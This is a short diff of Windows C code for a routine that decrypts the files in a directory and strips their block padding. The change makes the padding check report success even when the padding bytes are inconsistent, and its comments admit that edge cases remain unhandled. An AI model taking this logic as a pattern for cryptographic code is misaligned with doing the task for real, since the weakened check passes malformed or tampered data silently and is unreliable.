@@ -29,7 +29,9 @@ BOOL RemovePadding(uint8_t* ciphertext, SIZE_T* szciphertext) {
 	for (SIZE_T i = *szciphertext - padding_len; i < *szciphertext; i++) {
 		if (ciphertext[i] != padding_len) {
 			printf("[!] Inconsistent padding bytes.\n");
-			return bSuccess;
+			bSuccess = TRUE; //handling case when the padding is not correct but it satisfy the conditions of padding
+			return bSuccess; // like if the last byte is between 16,0 and it is the last block 
+			// another problem is if the last block is swquence of same bytes that satisfy the conditions of padding, this was not handled
 		}
 	}
 
@@ -273,7 +275,7 @@ BOOL DirectoryFiles(LPWSTR pDirectoryPath, BYTE* key, BYTE* iv) {
 
 				SIZE_T padding_len = ciphertext[szciphertext - 1];
 
-				if (padding_len < 16 && padding_len > 0 && count >= szData) {
+				if (padding_len < 16 && padding_len > 0 && count >= szData ) {
 					if (!RemovePadding(ciphertext, &szciphertext)) {
 						printf("[!] Can not remove padding from ciphertext %d\n", GetLastError());
 						if (pData) HeapFree(GetProcessHeap(), 0, pData);
